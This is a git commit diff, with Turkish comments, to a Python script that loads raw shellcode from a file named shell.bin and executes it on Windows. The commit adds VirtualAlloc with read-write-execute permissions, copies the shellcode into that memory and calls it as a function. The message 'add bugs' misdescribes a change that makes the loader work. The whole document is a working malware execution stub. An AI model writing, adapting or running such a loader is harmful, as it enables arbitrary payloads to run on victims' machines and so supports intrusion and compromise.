d2ed5bfdcf4a93a3ab3bbd2e8424592da516664d
Lunix <cyln.elif1@gmail.com>
2024-09-22 13:08:27 +0300

    add bugs

--- run.py
+++ run.py
@@ -1,6 +1,11 @@
 import ctypes
 import os
 
+# Bellek ayırma ve izinler için gerekli sabitler
+PAGE_EXECUTE_READWRITE = 0x40
+MEM_COMMIT = 0x1000
+MEM_RESERVE = 0x2000
+
 # Betiğin bulunduğu dizini al
 script_dir = os.path.dirname(os.path.abspath(__file__))
 
@@ -11,11 +16,10 @@ shellcode_path = os.path.join(script_dir, "shell.bin")
 with open(shellcode_path, "rb") as f:
     shellcode = f.read()
 
-# Shellcode'u çalıştırmak için bir buffer oluştur
-shellcode_buffer = ctypes.create_string_buffer(shellcode)
+# Bellek ayırma ve shellcode'u yazma
+ptr = ctypes.windll.kernel32.VirtualAlloc(None, len(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+ctypes.memmove(ptr, shellcode, len(shellcode))
 
-# Shellcode'un bellekte yürütülmesi için bir işaretçi ayarla
-shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(None))
-
-# Shellcode'u çalıştır
+# Shellcode'u çalıştırma
+shellcode_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
 shellcode_func()
